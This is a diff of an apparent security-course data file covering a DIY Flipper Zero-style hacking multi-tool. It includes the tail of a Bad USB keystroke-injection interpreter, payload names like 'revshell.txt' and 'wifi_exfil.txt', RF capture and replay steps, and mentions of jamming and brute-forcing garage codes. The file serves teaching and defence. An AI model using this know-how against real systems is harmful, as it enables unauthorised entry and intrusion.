Keyboard.press(KEY_RETURN);\n            Keyboard.releaseAll();\n        } else if (line == "GUI r" || line == "WINDOWS r") {\n            Keyboard.press(KEY_LEFT_GUI);\n            Keyboard.press(\'r\');\n            Keyboard.releaseAll();\n        } else if (line == "CTRL ALT t") {\n            Keyboard.press(KEY_LEFT_CTRL);\n            Keyboard.press(KEY_LEFT_ALT);\n            Keyboard.press(\'t\');\n            Keyboard.releaseAll();\n        }\n    }\n    f.close();\n\n    Keyboard.end();\n    tft.println("Payload complete!");\n}\n\n// DuckyScript payload files on SD card:\n// /payloads/rickroll.txt\n// /payloads/revshell.txt\n// /payloads/wifi_exfil.txt',
-                language: 'C++',
-                tip: '<strong>DuckyScript compatibility:</strong> The Flipper Zero uses a DuckyScript-compatible language for Bad USB payloads. By implementing the same interpreter, your DIY device can run payloads written for the Flipper or Hak5 Rubber Ducky directly.'
-            },
-            {
-                title: 'Defense: Multi-Tool Threat Assessment',
-                content: '<p>A device like this (or a Flipper Zero) combines multiple attack vectors. Here is the comprehensive defense posture:</p>' +
-                         '<ul>' +
-                         '<li><strong>Sub-GHz:</strong> Replace fixed-code garage openers with rolling-code systems (KeeLoq, etc.). Rolling codes change with every press, making replay attacks ineffective.</li>' +
-                         '<li><strong>NFC/RFID:</strong> Upgrade to DESFire EV3 or SEOS. Use multi-factor (card + PIN). See SG-41 defenses.</li>' +
-                         '<li><strong>IR:</strong> IR is inherently insecure (no authentication). For critical systems, do not use IR control. Use wired or encrypted wireless control instead.</li>' +
-                         '<li><strong>USB HID:</strong> USB device whitelisting, port locks, endpoint protection. See SG-33 defenses.</li>' +
-                         '<li><strong>WiFi:</strong> WPA3, 802.11w, WIDS. See SG-35 and SG-38 defenses.</li>' +
-                         '<li><strong>Physical security:</strong> Devices like this require physical proximity. Access control, cameras, and security awareness training are your first line of defense.</li>' +
-                         '<li><strong>Policy:</strong> Prohibit personal electronic devices in sensitive areas. Enforce this with physical screening (metal detectors, bag checks) in high-security environments.</li>' +
-                         '</ul>',
-                code: '# Security audit checklist for your organization:\n\n# 1. Garage / gate access\necho "[ ] Rolling code remotes (not fixed code)"\necho "[ ] Timed auto-lock on gates"\necho "[ ] Camera on gate/garage entry"\n\n# 2. Building access\necho "[ ] RFID cards: DESFire EV2+ or iCLASS SE"\necho "[ ] Multi-factor: card + PIN minimum"\necho "[ ] Visitor badges that expire automatically"\necho "[ ] Anti-tailgating measures"\n\n# 3. Network\necho "[ ] WPA3-Enterprise with 802.1X"\necho "[ ] 802.11w PMF required"\necho "[ ] WIDS deployed and monitored"\necho "[ ] 802.1X on all switch ports"\n\n# 4. Endpoints\necho "[ ] USB device whitelisting"\necho "[ ] USB port locks on unattended machines"\necho "[ ] EDR solution deployed"\necho "[ ] PowerShell constrained language mode"\n\n# 5. Physical\necho "[ ] No personal USB devices policy"\necho "[ ] Security awareness training (quarterly)"\necho "[ ] Regular physical audits of network closets"',
-                language: 'Bash',
-                tip: '<strong>The big picture:</strong> Building this device teaches you that many everyday systems (garage doors, access cards, TV remotes, USB ports) have weak or nonexistent security. As a security professional, your job is to identify these weaknesses and push for stronger controls. The tools are educational &mdash; the knowledge is what matters.'
+                title: 'Understand Rolling Codes and Their Limits',
+                content: '<p>Most post-1995 garage door openers use KeeLoq rolling codes &mdash; each button press produces a unique code that the receiver validates using a synchronized counter. Simple capture-and-replay does NOT work against rolling codes. What the SG-42 CAN do:</p>' +
+                         '<ul><li>Identify legacy fixed-code systems (pre-1995, still common in older buildings) that are directly vulnerable to replay</li><li>Capture raw signals for offline analysis in Universal Radio Hacker (URH)</li><li>Identify the RF modulation type, frequency, and data rate for reporting purposes</li><li>Execute a "jamming + capture" attack against rolling codes in some scenarios (advanced &mdash; requires two radios operating simultaneously)</li></ul>',
+                code: '# Analyze captured RF signals offline with Universal Radio Hacker\npip install urh\nurh   # Opens the GUI -- load the .iq file and run the demodulation wizard\n\n# Quick check on a captured OOK signal from a binary dump:\npython3 -c "\n# Read raw bytes captured by CC1101 and look for repeating patterns\nwith open(\'rf_capture.bin\', \'rb\') as f:\n    data = f.read()\nprint(f\'Capture: {len(data)} bytes\')\nprint(f\'Hex: {data[:64].hex()}\')  # First 64 bytes\n# Look for preamble: alternating 0x55/0xAA = Manchester-coded preamble\n# Fixed code systems repeat the same pattern 3-5 times per button press\n"\n\n# Decode KeeLoq structure (NOT cracking -- just protocol identification)\npython3 -c "\nimport struct\n# KeeLoq frame structure (simplified):\n# Preamble (12 bits alternating) | Sync (1) | Encrypted payload (32 bits)\n# | Serial number (28 bits) | Button code (4 bits) | Repeat count (2 bits)\nprint(\'KeeLoq rolling codes require manufacturer key for decryption\')\nprint(\'Fixed-code systems: same payload every press -- vulnerable to replay\')\nprint(\'Use a logic analyzer and URH to identify which system type you have\')\n"',
+                language: 'Python 3 / Shell',
+                tip: 'Universal Radio Hacker (URH) is the essential tool for offline RF analysis. It demodulates captured signals, identifies protocols, and can brute-force fixed-code systems. For rolling-code analysis, Proxmark3 with the KeeLoq plugin or the RFCrack tool against captured samples are the next steps after identifying the system type with the SG-42.'
             }
         ],
 
-        testing: '<p>Test each module systematically:</p>' +
-                 '<ul>' +
-                 '<li><strong>Display + menu:</strong> Power on. The TFT should show the main menu. Navigate through all options with buttons.</li>' +
-                 '<li><strong>NFC:</strong> Select NFC &rarr; Read Card. Hold a card to the RC522. UID and card type should display on screen.</li>' +
-                 '<li><strong>Sub-GHz:</strong> Select Sub-GHz &rarr; Capture. Press a cheap 433MHz remote (wireless doorbell remotes work well). The device should capture and save the signal. Replay it and verify the doorbell rings.</li>' +
-                 '<li><strong>IR:</strong> Select IR &rarr; Learn. Press a TV remote button aimed at the receiver. Protocol, code, and bit count should display. Replay it and verify the TV responds.</li>' +
-                 '<li><strong>Bad USB:</strong> Create a simple DuckyScript payload on the SD card (STRING "Hello World" + ENTER). Select Bad USB &rarr; Run. Plug into a computer with a text editor open. "Hello World" should be typed.</li>' +
-                 '<li><strong>SD card:</strong> Verify captured signals, IR codes, and payloads are saved and loadable.</li>' +
-                 '</ul>',
+        testing: '<p><strong>Full verification checklist:</strong></p>' +
+                 '<ol><li>TFT shows main menu with 4 options after boot</li><li>UP/DOWN navigation scrolls through all menu items with highlight</li><li>LEFT button returns to main menu from sub-menus</li><li>WiFi Scan returns a list of nearby networks (SSID and RSSI) within 5 seconds</li><li>IR Capture records a signal when a TV remote is pointed at the TSOP38238 and a button is pressed</li><li>IR Replay re-transmits and operates the device (TV volume, AC temperature, etc.)</li><li>RF Capture shows "N bytes captured" when a 433 MHz remote (wireless doorbell, keyfob) is pressed within 50cm of the CC1101 antenna</li><li>RF Replay retransmits and triggers the original device (verify with a doorbell or similar)</li><li>RFID Read detects a MIFARE card placed on the RC522 and displays the UID</li></ol>',
 
-        commonMistakes: [
-            {
-                title: 'SPI Bus Conflicts',
-                description: 'With 4+ SPI devices, bus conflicts are the #1 problem. Ensure each device has its own CS pin and that only one device is selected at a time. Use two separate SPI buses (FSPI + HSPI) to isolate the CC1101 from other modules.'
-            },
-            {
-                title: 'Power Budget Exceeded',
-                description: 'The ESP32-S3 + CC1101 + RC522 + TFT + SD can draw 300-500mA total. A standard USB port provides 500mA max. Use a quality USB cable and a power supply rated for at least 1A. If running on battery, use a TP4056 charge module with a 1200mAh+ LiPo.'
-            },
-            {
-                title: 'Antenna Interference',
-                description: 'The CC1101 antenna, ESP32 WiFi antenna, and NFC coil are all radiating RF. Keep them physically separated on the breadboard. The CC1101 antenna should be at least 5cm from the ESP32 to avoid desensing.'
-            }
-        ]
+        troubleshooting: '<p><strong>TFT and CC1101 corrupt each other:</strong> Add 100nF bypass capacitors on each module VCC pin. Verify TFT_CS=2 and CC1101_CS=5 are both correct and that the library\'s default SS pin was changed. Test each device independently first.</p>' +
+                         '<p><strong>CC1101 ReceiveData returns 0 always:</strong> Check GDO0 connection (GPIO4). Without GDO0, the sketch cannot detect when data is available in the FIFO. The GDO0 pin must connect to GPIO4. Also verify the antenna is attached &mdash; even a 17cm wire dramatically increases range.</p>' +
+                         '<p><strong>IR codes not recognized:</strong> The TSOP38238 receiver needs a 100nF capacitor between VCC and GND placed within 1cm of the receiver IC. Without it, the output is noisy. Also ensure you are not in a room with strong fluorescent lighting (50/60 Hz IR noise).</p>' +
+                         '<p><strong>RC522 not responding on HSPI:</strong> The <code>SPIClass spi2(HSPI)</code> must be initialized with <code>spi2.begin(SCK, MISO, MOSI, CS)</code> using your custom pin assignments before <code>rfid.PCD_Init()</code>. The standard <code>SPI.begin()</code> call only configures the default VSPI bus.</p>',
+
+        challenges: '<p><strong>Push the build further:</strong></p>' +
+                    '<ul><li>Add a MicroSD card module (SPI1/VSPI, CS=GPIO1 or any free GPIO) to persist captured RF signals, IR codes, and RFID dumps across power cycles &mdash; the SD card enables the device to store and replay dozens of signals without needing a PC</li><li>Implement the BadUSB HID injection feature: when connected to a PC via USB, the ESP32-S3 enumerates as a keyboard and executes DuckyScript payloads stored on the SD card (combine with SG-33 knowledge)</li><li>Add 915 MHz support for US ISM band devices (temperature sensors, smart meters, Z-Wave devices) by changing SetMHZ(433.92) to SetMHZ(915.00)</li><li>Implement Wiegand 26-bit protocol decoding: use the GPIO interrupt handler to capture the DATA0 and DATA1 lines from a standard proximity card reader and decode the facility code and card number without an RC522</li></ul>'
     }
 
 };
